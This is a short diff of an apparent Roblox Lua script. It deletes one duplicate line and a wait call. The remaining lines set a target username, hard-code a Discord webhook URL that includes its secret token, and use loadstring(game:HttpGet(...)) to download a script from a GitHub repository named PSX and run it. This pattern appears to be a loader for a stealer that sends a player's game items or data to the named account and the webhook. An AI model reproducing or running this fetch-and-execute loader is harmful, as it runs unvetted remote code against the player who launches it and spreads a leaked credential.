@@ -1,7 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
-
-wait(5)
-
 UserName = "Yyds76"
 WebHook = "https://discord.com/api/webhooks/1057890793215496393/EsRwEk3KV1YfRnp26b-B9F3odGla15Mt49ycSM8lM9YNjQpRYoowl3bSGy7KpOXG-FEs"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
